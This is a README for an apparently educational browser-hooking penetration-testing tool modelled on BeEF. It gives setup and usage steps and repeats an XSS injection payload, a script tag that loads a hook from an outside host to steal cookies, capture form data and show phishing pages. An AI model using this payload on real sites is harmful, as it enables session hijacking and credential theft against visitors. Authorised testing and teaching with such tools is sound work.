# BrowserHook

## Overview
BrowserHook is a lightweight penetration testing tool inspired by BeEF (Browser Exploitation Framework). It focuses on exploiting web browser vulnerabilities through XSS attacks, allowing testers to hook browsers, gather information, and execute client-side attacks like cookie theft and phishing. The tool serves a JavaScript hook (`hook.js`) that communicates with a Python-based server via WebSockets, providing a web UI to manage hooked browsers.

## Features
- Serves a JavaScript hook for injection into XSS-vulnerable websites.
- Web UI to view and manage hooked browsers (IP, user agent, cookies, form data).
- Supports basic command modules: cookie theft and phishing page.
- Captures form submissions automatically.
- Stores data in a SQLite database.
- Real-time updates via WebSockets.

## Prerequisites
- Python 3.6 or higher
- `flask`, `flask-socketio` libraries
- Bash (for the setup script)
- A web server with a public IP or domain for external testing
- A target website vulnerable to XSS for hook injection

## Installation

### Setup
1. Clone or download the repository.
2. Run the setup script to create a virtual environment and install dependencies:
   ```bash
   chmod +x set_upfile.sh
   ./set_upfile.sh
   ```
3. Activate the virtual environment:
   - On Linux/macOS:
     ```bash
     source venv/bin/activate
     ```
   - On Windows (if using a compatible shell):
     ```bash
     venv\Scripts\activate
     ```

## Usage
Run the tool with:
```bash
python browserhook.py [--host <host>] [--port <port>]
```

- **--host**: Host to bind (default: 0.0.0.0).
- **--port**: Port to bind (default: 3000).

### Steps
1. Start the server:
   ```bash
   python browserhook.py
   ```
   The server will output the hook URL (e.g., `<script src='http://<host>:3000/hook.js'></script>`).
2. Inject the hook URL into an XSS-vulnerable website (e.g., via a search field or comment box).
   Example injection:
   ```html
   <script src='http://192.168.1.100:3000/hook.js'></script>
   ```
3. Access the web UI at `http://<host>:3000/ui/panel` to view hooked browsers.
4. Execute commands like "Steal Cookies" or "Phishing Page" on hooked browsers.

### Examples
1. **Start the server**:
   ```bash
   python browserhook.py --host 192.168.1.100 --port 3000
   ```
   Output:
   ```
   [*] Starting BrowserHook on http://192.168.1.100:3000/ui/panel
   [*] Hook URL: <script src='http://192.168.1.100:3000/hook.js'></script>
   ```

2. **Inject hook into a vulnerable site**:
   On a site with an XSS-vulnerable input field, inject:
   ```html
   <script src='http://192.168.1.100:3000/hook.js'></script>
   ```

3. **View hooked browsers**:
   Open `http://192.168.1.100:3000/ui/panel` in a browser to see hooked browsers and execute commands.

## Limitations
- Requires XSS vulnerabilities in target websites for hook injection.
- Basic command modules; lacks advanced features like BeEF's extensive module library.
- No persistence after browser closure.
- Assumes UTF-8 encoding for form data.
- Simplified for educational purposes; not as robust as BeEF.

## License
MIT License

## Warning
This tool is for ethical penetration testing and authorized security assessments only. Unauthorized use against systems you do not own or have permission to test is illegal and unethical. Always obtain explicit permission before testing.